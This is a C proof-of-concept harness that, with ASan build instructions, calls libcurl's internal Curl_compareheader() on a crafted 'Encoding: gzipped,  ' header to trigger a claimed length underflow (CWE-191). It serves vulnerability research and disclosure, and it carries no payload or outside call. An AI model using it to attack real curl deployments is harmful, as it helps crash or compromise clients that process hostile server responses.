/* PoC for residual CWE-191 length underflow in Curl_compareheader().
 *
 * Build (ASan):
 *   cc -fsanitize=address -g -O0 -I/work/lib -I/work/include \
 *      -o residual residual.c /work/lib/libcurl-d.a -lpthread
 *
 * Curl_compareheader() is libcurl's internal HTTP response header matcher
 * (lib/http.c), exercised by callers such as the Transfer-Encoding /
 * Connection header checks reached while processing a server's HTTP
 * response. It is reached with attacker-controlled header text copied
 * straight from the wire into a heap buffer, exactly as crafted here.
 */
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

/* internal libcurl prototype, matching lib/http.h, as curl's own
 * tests/unit/unit1625.c does for this same function */
bool Curl_compareheader(const char *headerline, const char *header,
                         const size_t hlen, const char *content,
                         const size_t clen);

int main(void)
{
  /* a server response header line whose value ends in a comma followed by
     trailing blanks -- in-contract HTTP header syntax (OWS is legal
     trailing whitespace per RFC 9110) */
  const char *line = "Encoding: gzipped,  ";
  char *headerline = malloc(strlen(line) + 1);
  bool match;

  memcpy(headerline, line, strlen(line) + 1);

  match = Curl_compareheader(headerline, "Encoding:", strlen("Encoding:"),
                              "gzip", strlen("gzip"));
  printf("match=%d\n", match);

  free(headerline);
  return 0;
}
